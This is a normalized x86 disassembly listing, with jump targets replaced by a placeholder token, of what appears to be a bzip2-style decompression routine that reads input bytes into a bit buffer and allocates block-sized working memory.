mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
cmp edx 0x102
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + edx * 4 ]
jg r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
cmp edx 0x102
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + edx * 4 ]
jg r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
cmp edx 0x102
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + edx * 4 ]
jg r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
push 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
imul eax eax 0x186a0
shl eax 0x2
push eax
mov ecx [ ebp - 0x44 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp - 0x44 ]
mov ecx [ eax + 0x24 ]
call ecx
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc4c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc4c ] 0x0
jne r-xdata
push 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
imul edx edx 0x186a0
shl edx 0x1
push edx
mov eax [ ebp - 0x44 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp - 0x44 ]
mov eax [ edx + 0x24 ]
call eax
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc50 ] eax
push 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
imul eax eax 0x186a0
add eax 0x1
sar eax 0x1
push eax
mov ecx [ ebp - 0x44 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp - 0x44 ]
mov ecx [ eax + 0x24 ]
call ecx
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc54 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc50 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
cmp [ ebp - 0x18 ] 0x10
jge r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov [ ebp - 0xd1 ] 0x0
jmp r-xdata
mov [ ebp - 0x74 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
mov eax 0x1
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
cmp [ ebp - 0x28 ] 0x1
jl r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
